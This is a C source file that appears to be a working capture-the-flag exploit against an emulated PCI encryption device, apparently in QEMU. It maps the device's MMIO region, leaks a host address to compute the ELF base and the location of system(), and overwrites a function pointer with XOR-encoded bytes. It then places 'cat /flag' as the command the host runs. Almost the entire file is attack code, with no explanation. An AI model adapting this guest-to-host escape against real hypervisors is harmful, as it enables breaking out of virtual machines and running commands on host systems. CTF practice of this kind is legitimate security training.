#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

unsigned char* mmap_addr;

void mmio_write(uint32_t addr, uint8_t value)
{
    *((uint8_t *)(mmap_addr + addr)) = value;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*)(mmap_addr + addr));
}

void init_buf(){
    mmio_read(0x800+2);
}

void set_statu(uint8_t value){
    mmio_read(0x800+1);
    mmio_write(0,value);
}

void set_mode(uint8_t value){
    set_statu(2);
    mmio_write(0,value);
}

void set_func(){
    set_statu(3);
    mmio_write(0,0);
}

void encrypt_func(){
    set_mode(1);
    set_statu(3);
    mmio_read(0);
}

void decrypt_func(){
    set_mode(2);
    set_statu(3);
    mmio_read(0);
}

void set_key(uint32_t offset,uint8_t value){
    set_statu(1);
    mmio_write(0x800+offset,value);
}

void set_input(uint32_t offset,uint8_t value){
    set_statu(2);
    mmio_write(0x800+offset+0x80,value);
}

uint8_t get_output(uint32_t offset){
    set_statu(3);
    return mmio_read(0x800+offset+0x110);
}

uint8_t get_input(uint32_t offset){
    set_statu(2);
    return mmio_read(0x800+offset+0x90);
}

int main(int argc, char *argv[])
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource4", O_RDWR | O_SYNC);
    if(fd == -1){
        perror("open error.");
    }

    mmap_addr = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(mmap_addr == MAP_FAILED){
        perror("mmap error.");
    }

    set_func();

    set_key(0,0x42);
    for(int i=0;i<0x80;i++){
        set_input(i,0x41);
    }
    encrypt_func();

    uint64_t data = 0;
    uint64_t tmp = 0;
    for(int i=0;i<8;i++){
        uint64_t get_buf = get_output(0x80+i);
	tmp = get_buf << (8*i);
	data += tmp;
    }
    uint64_t elf_base = data - 0x4fa470;//0x5f7034;//0x4fa470
    uint64_t system_plt = elf_base + 0x2a6bb0;//0x2b5630;//0x2a6bb0
    printf("leak addr :0x%lx\n",data);
    printf("elf base :0x%lx\n",elf_base);
    printf("system addr:0x%lx\n",system_plt);

    uint8_t data1 = (system_plt & 0xFF)^0x11^0x33;
    uint8_t data2 = ((system_plt >> 8) & 0xFF)^0x22^0x11;
    uint8_t data3 = ((system_plt >> 16) & 0xFF)^0x33^0x22;
    uint8_t data4 = ((system_plt >> 24) & 0xFF)^0x11^0x33;
    uint8_t data5 = ((system_plt >> 32) & 0xFF)^0x22^0x11;
    uint8_t data6 = ((system_plt >> 40) & 0xFF)^0x33^0x22;
    uint8_t data7 = 0^0x11^0x33;
    uint8_t data8 = 0^0x22^0x11;
    
    init_buf();
    set_key(0,0x11);
    set_key(1,0x22);
    set_key(2,0x33);

    for(int i=0;i<0x8;i++){
        set_input(i,0x42);
    }
    encrypt_func();

    set_input(0,data1);
    set_input(1,data2);
    set_input(2,data3);
    set_input(3,data4);
    set_input(4,data5);
    set_input(5,data6);
    set_input(6,data7);
    set_input(7,data8);
    for(int i=0;i<0x78;i++){
        set_input(i+0x8,0x98);
    }
    encrypt_func();

    char *shellcode = "cat /flag";
    for(int i=0;i<strlen(shellcode);i++){
        set_key(i,shellcode[i]);
    }

    decrypt_func();
}
